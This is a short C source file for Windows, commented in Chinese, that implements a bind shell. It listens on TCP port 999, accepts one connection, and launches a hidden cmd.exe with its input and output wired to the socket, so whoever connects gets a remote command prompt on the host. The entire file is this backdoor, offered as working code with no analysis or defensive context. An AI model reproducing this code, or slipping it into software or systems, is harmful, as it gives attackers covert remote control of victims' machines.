// 如果编译报错, 请将 #include <winsock2.h> 添加到 <windows.h> 最开始里头
// 在工程设置链接里头加 ws2_32.lib
#pragma comment(lib, "ws2_32.lib")
#include <windows.h>
#define MasterPort 999



main(){
    WSADATA WSADa;              //定义 Window socket 结构
    sockaddr_in SockAddrIn;     //定义套接字结构
    SOCKET Csock, Ssock;
    int iAddrSize;              
    PROCESS_INFORMATION ProcessInfo; //创建进程相关结构，返回有关新进程及其主线程信息

    STARTUPINFO StartupInfo;   //定义程序启动窗体相关参数
    char szCMDPath[255];

    //分配内存资源，初始化数据
    ZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));  //理解为 memset 
    ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
    ZeroMemory(&WSADa, sizeof(WSADATA));

    //获取CMD路径
    GetEnvironmentVariable("COMSPEC", szCMDPath, sizeof(szCMDPath));

    //加载ws2_32.dll
    WSAStartup(0x0202, &WSADa);  //0X0202 socket版本号，等价于 MAKEWORD(2,2);

    //设置和建立Socket
    SockAddrIn.sin_family = AF_INET;
    SockAddrIn.sin_addr.s_addr = INADDR_ANY;
    SockAddrIn.sin_port = htons(MasterPort);
    Csock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    //绑定端口 999
    bind(Csock, (sockaddr *)&SockAddrIn, sizeof(SockAddrIn));

    //监听
    listen(Csock, 1);
    iAddrSize = sizeof(SockAddrIn);

    Ssock = accept(Csock, (sockaddr *)&SockAddrIn, &iAddrSize);

    StartupInfo.cb = sizeof(STARTUPINFO);  //设置结构字节数
    StartupInfo.wShowWindow = SW_HIDE;     //设置窗体出现方式
    StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; //使用wShowWindow 和 hstd 成员
    StartupInfo.hStdInput = (HANDLE)Ssock;
    StartupInfo.hStdOutput = (HANDLE)Ssock;
    StartupInfo.hStdError = (HANDLE)Ssock;

    CreateProcess(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &StartupInfo, &ProcessInfo);  //创建进程
    WaitForSingleObject(ProcessInfo.hProcess, INFINITE); //挂起等待信号，等待不超时
    CloseHandle(ProcessInfo.hProcess); // 当上面的函数接受到信号，就会执行此步骤，也就是关闭进程
    CloseHandle(ProcessInfo.hThread);

    closesocket(Csock);  //关闭套接字
    closesocket(Ssock);
    WSACleanup();        //一点清理工作
    return 0;
}
